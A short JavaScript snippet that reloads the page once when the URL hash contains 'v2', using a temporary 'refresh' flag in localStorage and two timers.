if (window.location.hash.includes("v2")) {
    var refresh = window.localStorage.getItem('refresh');
    console.log(refresh);

    // Reload the page if refresh is null
    setTimeout(function() {
        if (refresh === null) {
            window.location.reload();
            window.localStorage.setItem('refresh', "1");
        }
    }, 400); // Wait for 400 milliseconds before reloading

    // Remove 'refresh' from localStorage after a short delay
    setTimeout(function() {
        localStorage.removeItem('refresh')
    }, 150); // Wait for 150 milliseconds
}



